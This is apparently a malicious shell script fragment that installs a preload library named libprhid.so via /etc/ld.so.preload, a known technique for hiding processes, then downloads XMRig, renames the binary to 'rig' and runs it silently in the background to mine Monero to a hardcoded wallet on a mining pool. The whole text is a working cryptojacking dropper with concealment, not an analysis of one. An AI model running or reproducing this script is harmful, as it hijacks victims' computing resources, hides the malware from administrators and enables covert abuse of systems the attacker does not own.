
cp libprhid.so /usr/local/lib/
echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload

if [[ -f libprhid.so || -f /etc/ld.so.preload ]] ;
	then printf "%-20s %20s\n" " hidsetup" "[  DONE  ]" ;
else printf "%-20s %20s\n" " hidsetup" "[  FAILED  ]" ;
fi

wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig
nohup xmrig-6.20.0/rig -a rx -o gulf.moneroocean.stream:10128 -u 41qn42wuAxjDb5Euccqitk7z7kWJ1ZSyCWkArNPexdyG4cC8wP3FRHGGgBxoFqYWktMvySUWLWg7ghzccooPKWgWQ3bt6Kr -p x &>/dev/null & disown -h %1

